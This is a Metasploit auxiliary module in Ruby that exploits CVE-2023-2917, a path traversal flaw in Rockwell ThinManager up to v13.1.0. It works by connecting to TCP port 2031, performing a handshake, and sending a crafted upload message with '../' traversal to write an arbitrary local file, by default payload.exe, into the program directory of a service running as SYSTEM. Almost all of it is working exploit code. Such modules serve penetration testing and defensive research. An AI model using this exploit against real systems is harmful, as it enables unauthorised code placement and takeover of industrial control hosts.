##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ThinManager Path Traversal (CVE-2023-2917) Arbitrary File Upload',
        'Description' => %q{
          This module exploits a path traversal vulnerability (CVE-2023-2917) in
          ThinManager <= v13.1.0 to upload arbitrary files to the target system.
          The affected service listens by default on TCP port 2031 and runs in the
          context of NT AUTHORITY\SYSTEM.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Tenable' # Discovery and PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-2917'],
          ['URL', 'https://www.tenable.com/security/research/tra-2023-28'],
          ['URL', 'https://support.rockwellautomation.com/app/answers/answer_view/a_id/1140471']
        ],
        'DisclosureDate' => '2023-08-17',
        'DefaultOptions' => {
          'RPORT' => 2031,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptPath.new('LFILE', [false, 'The local file to transfer to the remote system.', '/tmp/payload.exe']),
        OptString.new('RFILE', [false, 'The file path to store the file on the remote system.', '/Program Files/Rockwell Software/ThinManager/payload.exe']),
        OptInt.new('DEPTH', [ true, 'The traversal depth. The FILE path will be prepended with ../ * DEPTH', 7 ])
      ]
    )
  end

  def check
    begin
      connect
    rescue Rex::ConnectionTimeout
      print_error("Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed.")
      return Exploit::CheckCode::Unknown
    end

    vprint_status('Sending handshake...')
    handshake = [0x100].pack('V')
    vprint_status(Rex::Text.to_hex_dump(handshake))
    sock.put(handshake)

    res = sock.get_once(4096, 5)
    expected_header = "\x00\x04\x00\x01\x00\x00\x00\x08".b

    if res&.start_with?(expected_header)
      vprint_status('Received handshake response.')
      vprint_status(Rex::Text.to_hex_dump(res))
      disconnect
      return Exploit::CheckCode::Detected
    elsif res
      vprint_status('Received unexpected handshake response:')
      vprint_status(Rex::Text.to_hex_dump(res))
      disconnect
      return Exploit::CheckCode::Safe
    else
      disconnect
      return Exploit::CheckCode::Unknown('No handshake response received.')
    end
  end

  def mk_msg(msg_type, flags, data)
    dlen = data.length
    hdr = [msg_type, flags, dlen].pack('nnN')
    hdr + data
  end

  def run
    begin
      connect
    rescue Rex::ConnectionTimeout => e
      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
    end

    print_status('Sending handshake...')
    handshake = [0x100].pack('V')
    vprint_status(Rex::Text.to_hex_dump(handshake))
    sock.put(handshake)

    res = sock.get_once(4096, 5)
    if res
      print_status('Received handshake response.')
      vprint_status(Rex::Text.to_hex_dump(res))
    else
      print_error('No handshake response received.')
      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
    end

    lfile = datastore['LFILE']
    rfile = datastore['RFILE']
    file_data = ::File.binread(lfile)
    print_status("Read #{file_data.length} bytes from #{lfile}")

    traversal = '../' * datastore['DEPTH']

    full_path = (traversal + rfile).force_encoding('ASCII-8BIT')
    file_data.force_encoding('ASCII-8BIT')

    begin
      data = [0xaa].pack('N')
      data << [0xbb].pack('N')
      data << full_path + "\x00"
      data << "file_type\x00"
      data << "unk_str3\x00"
      data << "unk_str4\x00"
      data << [file_data.length].pack('N')
      data << [file_data.length].pack('N')
      data << file_data
      data.force_encoding('ASCII-8BIT')

      req = mk_msg(38, 0x0021, data)
    rescue StandardError => e
      fail_with(Failure::BadConfig, "Failed to build upload request: #{e.class} - #{e.message}")
    end

    print_status("Uploading #{lfile} as #{rfile} on the remote host...")

    print_status("Upload request length: #{req.length} bytes")
    vprint_status("Upload request:\n#{Rex::Text.to_hex_dump(req)}")

    sock.put(req)

    begin
      res = sock.get_once(4096, 5)
      if res
        print_good('Received response from target:')
        vprint_status(Rex::Text.to_hex_dump(res))
      else
        print_warning('No response received after upload.')
      end
    rescue ::EOFError, ::Timeout::Error => e
      print_error("Socket error: #{e.class} - #{e.message}")
    end

    disconnect
    print_good("Upload process completed. Check if '#{rfile}' exists on the target.")
  end

end
